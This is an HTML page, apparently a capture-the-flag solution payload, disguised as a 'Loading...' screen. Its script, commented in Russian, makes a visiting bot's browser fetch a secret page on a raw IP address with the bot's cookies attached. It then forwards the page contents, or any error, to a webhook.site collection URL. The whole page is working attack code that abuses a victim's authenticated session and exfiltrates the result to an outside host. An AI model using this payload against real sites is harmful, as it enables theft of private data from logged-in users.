<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        // Делаем запрос на секретную страницу Кранга
        // Браузер бота автоматически отправит его cookies
        fetch('http://158.160.184.159:13002/kraang/brain', {
            credentials: 'include'  // Отправляет cookies бота
        })
        .then(response => response.text())
        .then(data => {
            // Отправляем содержимое страницы на webhook
            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? flag=' + encodeURIComponent(data));
        })
        .catch(error => {
            // Если есть ошибка CORS, отправляем информацию об ошибке
            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? error=' + encodeURIComponent(error));
        });
    </script>
    <p>Loading...</p>
</body>
</html>
